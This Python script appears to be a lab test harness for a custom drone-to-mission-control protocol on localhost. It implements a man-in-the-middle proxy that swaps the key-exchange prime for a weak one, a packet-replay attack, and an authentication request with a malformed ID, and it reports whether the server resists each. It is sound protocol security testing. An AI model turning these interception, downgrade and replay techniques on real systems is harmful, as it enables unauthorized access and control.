import socket
import struct
import threading
import time
import sys
from crypto_utils import Helper, Elgamal, Colors

# Configuration
REAL_MCC_HOST = "127.0.0.1"
REAL_MCC_PORT = 9000
ATTACKER_PORT = 9001 

class MitMProxy:
    def __init__(self, mode):
        self.mode = mode
        self.captured_auth_packet = None
        self.running = True

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", ATTACKER_PORT))
        server.listen(1)
        
        print(f"\n{Colors.HEADER}[ATTACKER] Listening on port {ATTACKER_PORT}...{Colors.ENDC}")
        print(f"{Colors.WARNING}[ATTACKER] >> PLEASE RUN: python3 drone.py (ensure it connects to port {ATTACKER_PORT}){Colors.ENDC}")

        while self.running:
            try:
                drone_sock, addr = server.accept()
                print(f"{Colors.CYAN}[ATTACKER] Intercepted connection from Drone: {addr}{Colors.ENDC}")
                threading.Thread(target=self.handle_connection, args=(drone_sock,)).start()
            except KeyboardInterrupt: break
            except Exception as e: print(f"[ERROR] {e}")

    def handle_connection(self, drone_sock):
        try:
            mcc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            mcc_sock.connect((REAL_MCC_HOST, REAL_MCC_PORT))
        except Exception as e:
            print(f"[ATTACKER] Failed to connect to Real MCC: {e}")
            drone_sock.close()
            return
        self.relay(drone_sock, mcc_sock)
        drone_sock.close()
        mcc_sock.close()

    def relay(self, drone, mcc):
        mcc.setblocking(0)
        drone.setblocking(0)
        while True:
            # MCC -> Drone
            try:
                data = mcc.recv(4096)
                if not data: break 
                if self.mode == "MITM" and data.startswith(b'\x0a'):
                    print(f"{Colors.FAIL}[ATTACKER] Phase 0 Detected! Tampering with Prime P...{Colors.ENDC}")
                    data = self.tamper_phase0(data)
                drone.sendall(data)
            except BlockingIOError: pass
            except Exception: break

            # Drone -> MCC
            try:
                data = drone.recv(4096)
                if not data: break
                if self.mode == "REPLAY" and data.startswith(b'\x14'): 
                    print(f"{Colors.FAIL}[ATTACKER] Captured AUTH_REQ packet! Storing for replay...{Colors.ENDC}")
                    self.captured_auth_packet = data
                mcc.sendall(data)
            except BlockingIOError: pass
            except Exception: break
            time.sleep(0.01)

        print(f"{Colors.CYAN}[ATTACKER] Session finished.{Colors.ENDC}")
        if self.mode == "REPLAY" and self.captured_auth_packet:
            self.execute_replay()
            self.running = False 

    def tamper_phase0(self, original_data):
        try:
            opcode = original_data[0:1]
            outer_len = struct.unpack("!I", original_data[1:5])[0]
            inner_payload = original_data[5:5+outer_len]
            signature = original_data[5+outer_len:] 
            p_len = struct.unpack("!I", inner_payload[0:4])[0]
            
            weak_p = 23
            weak_p_bytes = Helper.int_to_bytes(weak_p)
            weak_p_len_bytes = struct.pack("!I", len(weak_p_bytes))
            rest_of_payload = inner_payload[4+p_len:]
            
            new_inner_payload = weak_p_len_bytes + weak_p_bytes + rest_of_payload
            new_outer_len = struct.pack("!I", len(new_inner_payload))
            
            print(f"[ATTACKER] Replaced {p_len}-byte Prime with 1-byte Prime (23).")
            return opcode + new_outer_len + new_inner_payload + signature
        except Exception as e:
            return original_data

    def execute_replay(self):
        print(f"\n{Colors.HEADER}>>> LAUNCHING REPLAY ATTACK NOW <<<{Colors.ENDC}")
        time.sleep(1)
        try:
            replay_sock = socket.socket()
            replay_sock.connect((REAL_MCC_HOST, REAL_MCC_PORT))
            replay_sock.recv(4096) 
            
            print(f"{Colors.FAIL}[ATTACKER] Sending captured AUTH_REQ...{Colors.ENDC}")
            replay_sock.sendall(self.captured_auth_packet)
            
            time.sleep(0.5)
            response = replay_sock.recv(1024)
            
            if not response:
                print(f"{Colors.WARNING}[RESULT] Connection Closed. MCC rejected the Replay (Secure).{Colors.ENDC}")
            elif response.startswith(b'\x1e'): 
                print(f"{Colors.GREEN}[RESULT] FAILURE! MCC accepted the replayed packet! (Vulnerable).{Colors.ENDC}")
            elif response.startswith(b'\x3c'): 
                print(f"{Colors.WARNING}[RESULT] SUCCESS! MCC rejected the replay (Nonce/Timestamp Check).{Colors.ENDC}")
            else:
                print(f"[RESULT] Received Opcode: {response[0]}")
            replay_sock.close()
        except Exception as e:
            print(f"[ERROR] Replay failed: {e}")

def unauthorized_attack():
    print(f"\n{Colors.HEADER}[ATTACK 3] Unauthorized ID Access (Pattern Violation){Colors.ENDC}")
    try:
        sock = socket.socket()
        sock.connect((REAL_MCC_HOST, REAL_MCC_PORT))
        print(f"{Colors.CYAN}[ATTACKER] Connected. Consuming Phase 0...{Colors.ENDC}")
        
        # Consume Phase 0 (Manual Parse)
        opcode = sock.recv(1) 
        plen = struct.unpack("!I", sock.recv(4))[0]
        payload = b""
        while len(payload) < plen: payload += sock.recv(plen - len(payload))
        sock.recv(512) # Skip sig

        # Extract P, G, MCC_Pub
        offset = 0
        p_len = struct.unpack("!I", payload[offset:offset+4])[0]; offset += 4
        p = Helper.bytes_to_int(payload[offset:offset+p_len]); offset += p_len
        g_len = struct.unpack("!I", payload[offset:offset+4])[0]; offset += 4
        g = Helper.bytes_to_int(payload[offset:offset+g_len]); offset += g_len
        offset += 21 # Skip SL, TS, MCC_ID
        pub_len = struct.unpack("!I", payload[offset:offset+4])[0]; offset += 4
        mcc_pub = Helper.bytes_to_int(payload[offset:offset+pub_len])

        # Construct Packet with INVALID PATTERN ID
        print(f"{Colors.FAIL}[ATTACKER] Sending Auth Request with ID: 'EVIL-DRONE'...{Colors.ENDC}")
        
        my_priv, my_pub = Elgamal.keygen(p, g)
        c1, c2 = Elgamal.encrypt(12345, mcc_pub, p, g) # Dummy key
        ts = int(time.time()); rn = 999999
        
        # This ID violates the ^DRONE-\d{3}$ regex
        attacker_id = b"EVIL-DRONE".ljust(16, b'\x00') 
        
        body = (struct.pack("!Q", ts) + struct.pack("!Q", rn) + attacker_id +
                Helper.int_to_bytes(my_pub).rjust(256, b'\x00') +
                Helper.int_to_bytes(c1).rjust(256, b'\x00') + Helper.int_to_bytes(c2).rjust(256, b'\x00'))
        
        r, s = Elgamal.sign(body, my_priv, p, g) # Valid Signature
        msg = (struct.pack("!B", 20) + body + Helper.int_to_bytes(r).rjust(256, b'\x00') + Helper.int_to_bytes(s).rjust(256, b'\x00'))
        
        sock.sendall(msg)
        
        # Analyze Response
        response = sock.recv(1024)
        if not response or response[0] == 60:
             print(f"{Colors.WARNING}[RESULT] SUCCESS! Server rejected 'EVIL-DRONE' (Pattern Mismatch).{Colors.ENDC}")
        elif response[0] == 30:
             print(f"{Colors.FAIL}[RESULT] FAILURE! Server accepted Invalid ID Format!{Colors.ENDC}")
        else:
             print(f"[RESULT] Received Opcode: {response[0]}")
        sock.close()

    except Exception as e:
        print(f"[ERROR] Attack failed: {e}")

if __name__ == "__main__":
    print(f"{Colors.HEADER}=== UAV PROTOCOL ATTACK TOOL ==={Colors.ENDC}")
    print(f"Targeting MCC at {REAL_MCC_HOST}:{REAL_MCC_PORT}")
    print("--------------------------------")
    print("1. MitM Parameter Tampering (Proxy)")
    print("2. Replay Attack (Proxy + Active)")
    print("3. Unauthorized Access (Direct - Pattern Check)")
    
    choice = input(f"{Colors.BOLD}Select Attack > {Colors.ENDC}").strip()
    
    if choice == '1': MitMProxy("MITM").start()
    elif choice == '2': MitMProxy("REPLAY").start()
    elif choice == '3': unauthorized_attack()
    else: print("Invalid choice.")